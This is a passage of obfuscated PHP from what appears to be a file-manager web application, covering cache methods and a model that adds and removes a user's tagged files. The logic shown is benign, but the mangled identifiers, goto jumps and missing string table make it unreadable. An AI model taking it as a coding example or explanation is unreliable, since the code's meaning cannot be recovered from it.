$_SERVER[º·Ï‹¥³]; $¾¢§‹ß = self::get($î¾İğïÏ); if ($¾¢§‹ß || $¾¢§‹ß === $½áµìÇ´[12]) { return $¾¢§‹ß; } $¾¢§‹ß = call_user_func_array($úæñÑ, $«Ì³ ù); $¾¢§‹ß = $¾¢§‹ß ? $¾¢§‹ß : $½áµìÇ´[12]; self::set($î¾İğïÏ, $¾¢§‹ß, $ÖîíÅ¸ù); return $¾¢§‹ß; } public static function remove($Á·âÅØ) { $ç—º’óÔ = self::key($Á·âÅØ); unset(self::$memoryCache[$ç—º’óÔ]); self::clearTimeout(); CacheLock::lock($Á·âÅØ); $ŞÓƒß¦Ñ = self::init()->remove($ç—º’óÔ); CacheLock::unlock($Á·âÅØ); return $ŞÓƒß¦Ñ; } public static function removeMemory($»Ş¨¥‰) { $âıì­˜ = self::key($»Ş¨¥‰); unset(self::$memoryCache[$âıì­˜]); } public static function clearMemory($¾òö‚ = false) { if ($¾òö‚) { $¾òö‚ = self::key($¾òö‚); unset(self::$memoryCache[$¾òö‚]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[º·Ï‹¥³][884])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[º·Ï‹¥³][885])) { self::init()->clearTimeout(); } } } goto aÛ¨ ¼‰Ÿù; C©ò±á­—‰: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($ô‹‡œ¢) { $Æ“ã¼çÙ =& $_SERVER[º·Ï‹¥³]; return array($Æ“ã¼çÙ[2068] => array($Æ“ã¼çÙ[2482] . USER_ID, $Æ“ã¼çÙ[2069])); } protected function listData() { $ÊŒÆÜ‹ş =& $_SERVER[º·Ï‹¥³]; $¼±º‰–¦ = array($ÊŒÆÜ‹ş[1745] => USER_ID, $ÊŒÆÜ‹ş[542] => array($ÊŒÆÜ‹ş[2072], 0)); $î¯†”ş‚ = $ÊŒÆÜ‹ş[2483]; $áíŸ›şæ = $this->field($î¯†”ş‚)->where($¼±º‰–¦)->order($ÊŒÆÜ‹ş[2075])->select(); return $áíŸ›şæ ? $áíŸ›şæ : array(); } protected function addToTag($é§Ã‡¤Æ, $•É–ÎÙ) { $¶¤ÍÊË =& $_SERVER[º·Ï‹¥³]; if (!Model($¶¤ÍÊË[2219])->listData($•É–ÎÙ)) { return !1; } if (is_numeric($é§Ã‡¤Æ)) { $€î·Í† = Model($¶¤ÍÊË[876])->pathInfo($é§Ã‡¤Æ); if (!$€î·Í†) { return !1; } } else { $€î·Í† = IO::infoSimple($é§Ã‡¤Æ); if (!$€î·Í†) { return !1; } $ƒÑ—ğ¼Ğ = $€î·Í†[$¶¤ÍÊË[32]]; $Ó“˜¿‘ = $€î·Í†[$¶¤ÍÊË[33]]; if (isset($€î·Í†[$¶¤ÍÊË[469]])) { $Ó“˜¿‘ = $€î·Í†[$¶¤ÍÊË[469]] == $¶¤ÍÊË[91] ? $¶¤ÍÊË[78] : $¶¤ÍÊË[221]; } } $¶¢–Ñ¦‘ = array($¶¤ÍÊË[1745] => USER_ID, $¶¤ÍÊË[542] => $•É–ÎÙ, $¶¤ÍÊË[479] => $é§Ã‡¤Æ, $¶¤ÍÊË[480] => $Ó“˜¿‘ ? $Ó“˜¿‘ : $¶¤ÍÊË[474], $¶¤ÍÊË[478] => $ƒÑ—ğ¼Ğ ? $ƒÑ—ğ¼Ğ : $¶¤ÍÊË[12], $¶¤ÍÊË[1956] => 0); if ($this->where($¶¢–Ñ¦‘)->find()) { return !1; } return $this->add($¶¢–Ñ¦‘); } protected function removeFromTag($é±çëïà, $ÏÈÑª•) { $ƒãºÁ™» =& $_SERVER[º·Ï‹¥³]; if (!Model($ƒãºÁ™»[2219])->listData($ÏÈÑª•)) { return !1; } if (is_array($é±çëïà)) { $é±çëïà = array($ƒãºÁ™»[7], $é±çëïà); } $ÂêÇƒ·Ë = array($ƒãºÁ™»[1745] => USER_ID, $ƒãºÁ™»[542] => $ÏÈÑª•, $ƒãºÁ™»[479] => $é±çëïà); return $this->where($ÂêÇƒ·Ë)->delete(); } protected function removeByTag($œ® ¡Š) { $ÜÄÉ®‰Ä =& $_SERVER[º·Ï‹¥³]; if (!$œ® ¡Š) { return !1; } $Ç˜â’€Ÿ = array($ÜÄÉ®‰Ä[1745] => USER_ID, $ÜÄÉ®‰Ä[542] => $œ® ¡Š); return $this->where($Ç˜â’€Ÿ)->delete(); } protected function removeBySource($¦Šñü³) { $ºˆ½çá€ =& $_SERVER[º·Ï‹¥³]; if (is_array($¦Šñü³)) { $¦Šñü³ = array($ºˆ½çá€[7], $¦Šñü³); } $œ¾÷¶‘ = array($ºˆ½çá€[1745] => USER_ID, $ºˆ½çá€[542] => array($ºˆ½çá€[1063], 0), $ºˆ½çá€[479] => $¦Šñü³); return $this->where($œ¾÷¶‘)->delete(); } }